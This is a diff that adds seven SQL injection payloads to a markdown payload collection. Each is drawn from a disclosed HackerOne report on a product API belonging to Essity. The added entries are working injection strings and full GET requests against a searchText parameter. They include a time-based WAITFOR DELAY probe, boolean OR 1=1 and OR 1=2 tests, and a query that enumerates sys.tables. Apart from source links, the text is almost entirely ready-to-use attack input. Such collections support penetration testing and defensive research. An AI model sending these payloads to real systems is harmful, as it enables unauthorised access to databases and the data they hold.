@@ -1,6 +1,6 @@
 # SQL Injection
 
-139 payloads from disclosed reports.
+146 payloads from disclosed reports.
 
 ## Union-based SQL injection
 
@@ -664,6 +664,24 @@ Accept-Language: en-US,en
 **Parameter:** `coupon_codes`
 — [Woocommerce SQL Injection in WC_Report_Coupon_Usage](https://hackerone.com/reports/3198980) · Automattic · [q5ca](https://hackerone.com/q5ca)
 
+### `70fc978f`
+
+```
+GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--
+```
+
+**Parameter:** `searchText`
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
+
+### `b51dc9d0`
+
+```
+searchText=zzz');WAITFOR DELAY '0:0:6'--
+```
+
+**Parameter:** `searchText`
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
+
 ### `556d69c0`
 
 ```
@@ -1041,6 +1059,50 @@ alice' OR 1=1--
 ```
 
 — [SQL Injection Detection Bypass in AWS WAF Managed Rules (AWSManagedRulesSQLiRuleSet)](https://hackerone.com/reports/3591725) · AWS VDP · [killnet-edc](https://hackerone.com/killnet-edc)
+
+### `9b4428c4`
+
+```
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--
+```
+
+**Parameter:** `searchText`
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
+
+### `94a7fad5`
+
+```
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--
+```
+
+**Parameter:** `searchText`
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
+
+### `5341a7e0`
+
+```
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--
+```
+
+**Parameter:** `searchText`
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
+
+### `500088e7`
+
+```
+searchText=zzz') OR 1=1--
+```
+
+**Parameter:** `searchText`
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
+
+### `1b7b3011`
+
+```
+OR 1=1
+```
+
+— [Critical SQL Injection WDM API (████████)](https://hackerone.com/reports/3778282) · Essity · [matty69v](https://hackerone.com/matty69v)
 
 
 ## Error‑based SQL injection using UPDATEXML to extract MySQL version
